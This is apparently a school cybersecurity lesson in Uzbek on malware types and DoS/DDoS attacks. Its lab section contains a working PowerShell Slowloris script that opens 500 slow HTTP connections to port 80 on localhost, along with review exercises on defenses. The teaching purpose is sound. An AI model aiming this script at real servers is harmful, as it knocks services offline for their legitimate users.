---
title: "2-dars. Kibertahdidlarning turlari (1-qism): zararli dasturlar va DoS/DDoS hujumlari"
layout: "doc"
sidebar: false
aside: false
outline: false
kind: "dars"
dars: {"sinf": {"name": "10-sinf (Cyber)", "link": "/10-sinf-cyber/"}, "week": {"n": 1, "link": "/10-sinf-cyber/hafta-01/"}, "g": 2, "title": "Kibertahdidlarning turlari (1-qism): zararli dasturlar va DoS/DDoS hujumlari", "lead": "[!CAUTION]", "slide": "/slaydlar/10-sinf-cyber/hafta-01/dars-2.html", "tabs": [{"g": 1, "link": "/10-sinf-cyber/hafta-01/dars-1", "current": false}, {"g": 2, "link": "/10-sinf-cyber/hafta-01/dars-2", "current": true}, {"g": 3, "link": "/10-sinf-cyber/hafta-01/dars-3", "current": false}], "prev": {"g": 1, "title": "Kiberxavfsizlik asoslari: axborot xavfsizligi, kiberjinoyat, kiberqonun, inson omili va aktivlar", "link": "/10-sinf-cyber/hafta-01/dars-1"}, "next": {"g": 3, "title": "Kibertahdidlarning turlari (2-qism): ijtimoiy muhandislik, fishing va email tahlili", "link": "/10-sinf-cyber/hafta-01/dars-3"}}
---

---
title: "Kibertahdidlarning turlari (1-qism): zararli dasturlar va DoS/DDoS hujumlari"
description: "Zararli dasturlar tasnifi (virus, troyan, qurt, rootkit, ransomware) hamda DoS va Slowloris hujumlarining ishlash mexanizmi"
dars: 2
hafta: 1
sinf: 10-sinf-cyber
---

<div class="blk">

## <Icon name="file-text" /> Reja

1. Zararli dasturiy ta'minot (Malware) tushunchasi va turlari.
2. Virus, Qurt (Worm) va Troyan otlarining ishlash va tarqalish mexanizmlari.
3. Ransomware (Tovlamachi dasturlar), Spyware va Rootkitlar xavfi.
4. Xizmat ko'rsatishni rad etish (DoS va DDoS) hujumlari arxitekturasi.
5. Slowloris va TLS handshake to'yinganligi hujumlarining ishlash prinsipi.
6. Laboratoriya muhitida xavfsizlik monitoringi va himoya choralari.

---

</div>

<div class="blk">

## <Icon name="file-text" /> Nazariy qism

### 1. Zararli dastur (Malware) nima?

**Zararli dastur (Malicious Software)** — foydalanuvchining ruxsatisiz uning kompyuteriga, tizimiga yoki tarmog'iga zarar yetkazish, boshqaruvni qo'lga kiritish yoki maxfiy ma'lumotlarni o'g'irlash uchun maxsus yozilgan dasturiy ta'minotdir.

```
+-------------------------------------------------------------------------+
|                    ZARARLI DASTURLAR TASNIFI (MALWARE)                  |
+-------------------------------------------------------------------------+
| Ko'payish usuli bo'yicha:       | Funksional maqsadi bo'yicha:          |
| - Virus (fayllarga birikadi)    | - Spyware (ma'lumotlarni josuslash)   |
| - Qurt / Worm (tarmoqda tarqaladi)| - Ransomware (fayllarni shifrlash)    |
| - Troyan (niqoblanadi)          | - Adware (reklama ko'rsatish)         |
|                                 | - Rootkit (tizimda yashirinish)       |
|                                 | - Botnet (hujumlarda foydalanish)     |
+-------------------------------------------------------------------------+
```

### 2. Zararli dasturlarning 9 ta asosiy turi

1. **Virus (Virus):** O'zini boshqa fayllar (masalan, dasturlar, hujjatlar yoki operatsion tizimning yuklanuvchi sektori) ichiga joylashtirib, foydalanuvchi faylni ochganda ko'payadigan zararli dastur.
2. **Qurt (Worm):** Faylga birikishga muhtoj bo'lmagan, kompyuter tarmoqlari va zaif portlar orqali odam ishtirokisiz mustaqil tarqaladigan xavfli dastur.
3. **Troyan oti (Trojan Horse):** Bir qarashda foydali dastur (o'yin, tizimni tozalagich yoki fotosurat muharriri) ko'rinishida niqoblanib, ichida zararli kodni yashirib olib keluvchi dastur.
4. **Adware:** Foydalanuvchining kompyuterida uning ruxsatisiz doimiy reklama bannerlari va spam oynalarini chiqarib turuvchi dastur.
5. **Spyware (Josus dastur):** Foydalanuvchining qaysi tugmalarni bosayotgani (Keylogger), veb-kamera suratlari, parollar va shaxsiy xabarlarini yashirin yozib olib buzg'unchiga jo'natuvchi dastur.
6. **Rootkit:** Operatsion tizimning eng chuqur yadrosiga (Kernel) o'rnashib olib, o'zining va boshqa viruslarning mavjudligini antiviruslardan yashiruvchi vosita.
7. **Backdoor (Orqa eshik):** Standart autentifikatsiya jarayonini aylanib o'tib, hujumchiga tizimga istalgan paytda yashirincha kirish va buyruq bajarish imkonini beruvchi tuynuk.
8. **Mantiqiy bomba (Logic Bomb):** Ma'lum bir shart (masalan, aniq bir sana yoki xodimning tizimdan o'chirilishi) sodir bo'lguncha tinch yotadigan va shart bajarilishi bilan ma'lumotlarni yo'q qiluvchi kod.
9. **Ransomware (Tovlamachi dastur):** Qurbonning kompyuteridagi barcha hujjat, rasm va ma'lumotlar bazalarini kuchli kriptografik algoritm bilan shifrlab, parolni berish evaziga pul talab qiluvchi eng xavfli dastur.

---

### 3. DoS va DDoS hujumlari nima?

**DoS (Denial of Service — Xizmat ko'rsatishni rad etish):**
Hujumchining maqsadi axborotni o'g'irlash emas, balki serverni shu qadar ko'p so'rov yoki ulanishlar bilan to'ldirishki, natijada server qotib qoladi va qonuniy foydalanuvchilar (masalan, bank mijozlari yoki sayt o'quvchilari) saytdan foydalana olmay qoladi.

**DDoS (Distributed Denial of Service — Taqsimlangan DoS):**
Hujum bitta kompyuterdan emas, balki butun dunyo bo'ylab buzg'unchi tomonidan infektsiyalangan minglab «zombi» kompyuterlar tarmog'i (**Botnet**) orqali bir vaqtning o'zida amalga oshiriladi.

```
[ Botmaster (Hujumchi) ]
          |
          v (Buyruq yuborish)
[ C2 Server (Command & Control) ]
     /    |    \
    v     v     v
 [Bot 1] [Bot 2] [Bot 3] ... [Bot 1000] (Botnet tarmog'i)
    \     |     /
     v    v    v (Bir vaqtda millionlab so'rovlar)
   [ MAQSADLI SERVER (Qurbon) ] ----> QOTIB QOLISH (Crash / Offline)
```

### 4. Slowloris hujumi qanday ishlaydi?

Klassik DoS hujumlari gigabaytlab axlat paketlar (flood) jo'natishni talab qiladi. Ammo **Slowloris** juda ayyorona ishlaydi:
- Veb-serverga HTTP so'rovi yuboriladi, lekin so'rov oxiriga qadar yuborilmaydi (chala qoldiriladi).
- Har 10-15 soniyada serverga yangi sarlavha qismi uzatiladi.
- Server «mijoz hali xabarini tugatgani yo'q» deb ulanishni yopmay, kutish rejimida ushlaydi.
- Hujumchi 300-500 ta mana shunday sekin ulanish ochsa, veb-serverning barcha ulanish o'rinlari (connection pool) to'ladi va boshqa hech kim saytga kira olmaydi.

---

</div>

<div class="blk">

## <Icon name="file-text" /> Amaliy laboratoriya

> Ushbu amaliy mashg'ulot faqat laboratoriya muhitidagi shaxsiy sinov serveringizda (localhost / 127.0.0.1) o'rganish maqsadida bajariladi.

### Slowloris DoS tahlili (PowerShell)

Mahalliy serverda 80-port holatini va ochiq soketlarni tekshirish:

```powershell
# Sinov: 500 ta sekin ulanish ochish
1..500 | ForEach-Object {
    Start-Job -ScriptBlock {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect("127.0.0.1", 80)
            $stream = $tcp.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.WriteLine("GET / HTTP/1.1`r`nHost: localhost`r`n")
            $writer.Flush()
            Start-Sleep -Seconds 300
        } catch {}
    }
}
Write-Host "Sekin ulanishlar yuborildi. Server holatini tekshiring!"
```

Ulanishlar holatini monitoring qilish:
```powershell
Get-NetTCPConnection -LocalPort 80 | Group-Object State
```

---

</div>

<div class="blk">

## <Icon name="file-text" /> Amaliy topshiriqlar

### 1. Virus va Qurt farqi &lt;Badge type="tip" text="oson" />
Nima sababdan kompyuter qurtlari (worms) tarmoqda viruslarga nisbatan ancha tez va keng ko'lamda tarqaladi? Inson ishtiroki nuqtai nazaridan tushuntiring.

### 2. Slowloris xususiyati &lt;Badge type="tip" text="oson" />
Nima sababdan Slowloris hujumi past tezlikli DoS deb ataladi va uni amalga oshirish uchun nega katta internet kanali talab etilmaydi?

### 3. Ransomware shifrlash usuli &lt;Badge type="warning" text="o'rta" />
Tovlamachi viruslar foydalanuvchi fayllarini shifrlashda nima sababdan ham AES (simmetrik), ham RSA (asimmetrik) algoritmlaridan birgalikda foydalanadi?

### 4. DoS va DDoS solishtiruvi &lt;Badge type="warning" text="o'rta" />
Bitta IP manzildan qilinayotgan DoS hujumini server administratori qanday oson to'xtata oladi? Nega xuddi shu oddiy chora DDoS hujumiga qarshi ish bermaydi?

### 5. Slowloris dan himoyalanish &lt;Badge type="warning" text="o'rta" />
Veb-serverni (masalan, Nginx) Slowloris hujumidan himoya qilish uchun qanday 3 ta texnik chora ko'rish mumkin?

### 6. Troyan dasturi belgilari &lt;Badge type="tip" text="oson" />
Foydalanuvchi internetdan norasmiy saytdan bepul o'yin yuklab oldi. O'yin ochildi, lekin kompyuter kutilmaganda juda qizib, internet trafigi keskin oshib ketdi. Bu qanday zararli dastur turi bo'lishi mumkin va uning maqsadi nima?

### 7. Rootkit xavfliligi &lt;Badge type="danger" text="qiyin" />
Nima sababdan operatsion tizim ichida ishlayotgan oddiy antivirus ko'pincha Rootkit dasturlarini aniqlay olmaydi? U qaysi sathda ishlaydi?

### 8. Mantiqiy bomba (Logic Bomb) &lt;Badge type="warning" text="o'rta" />
Tashkilot ma'lumotlar bazasiga ma'lum bir sana yoki voqea sodir bo'lganda faollashib ma'lumotlarni o'chiruvchi kod kiritilgan. Bu qaysi zararli dastur turiga kiradi va uni qanday oldini olish mumkin?

### 9. PowerShell skripti tahlili &lt;Badge type="danger" text="qiyin" />
Darsdagi PowerShell skriptida nima sababdan `Start-Sleep -Seconds 300` kodi ishlatilgan? Agar bu kod olib tashlansa, hujum qanday o'zgaradi?

### 10. Botnet va C2 boshqaruvi &lt;Badge type="info" text="bonus" />
Botnet tarmog'idagi C2 (Command and Control) serverining roli nima? Agar ushbu server qonuniy organlar tomonidan bloklansa, botnet nima bo'ladi va xakerlar buni qanday aylanib o'tishadi?

---

</div>

<div class="blk">

## <Icon name="file-text" /> O'z-o'zini tekshirish savollari

1. Malware nima va uning asosiy turlari qaysilar?
2. Nima sababdan troyan otlari insonning o'z qo'li bilan o'rnatiladi?
3. Ransomware hujumidan saqlanishning eng asosiy qoidasi nima?
4. DoS hujumi tizimning qaysi xususiyatini ishdan chiqaradi?
5. Slowloris hujumi qaysi port va protokolda amalga oshiriladi?

---

</div>

<div class="blk">

## <Icon name="file-text" /> Foydali manbalar

- MITRE ATT&CK: Enterprise Techniques (Malware and Denial of Service).
- OWASP: Denial of Service Cheat Sheet.
- CISA: Understanding Denial-of-Service Attacks.

</div>

